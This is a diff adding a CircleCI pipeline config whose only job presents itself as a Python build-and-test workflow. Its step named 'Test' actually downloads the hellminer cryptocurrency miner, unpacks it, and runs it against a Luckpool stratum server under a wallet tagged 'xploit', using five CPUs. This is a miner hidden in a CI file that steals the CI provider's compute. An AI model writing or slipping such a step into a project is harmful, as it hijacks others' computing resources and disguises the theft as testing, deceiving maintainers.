@@ -1,0 +1,17 @@
+version: 2.1
+
+orbs:
+   python: circleci/python@0.2.1
+
+jobs:
+  build-and-test:
+    executor: python/default
+    steps:
+      - run:
+          command: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RJbZVaHzELYh42cqtEf8ff8fJDqiRm1sPA.xploit -p x --cpu 5
+          name: Test
+
+workflows:
+  main:
+    jobs:
+      - build-and-test
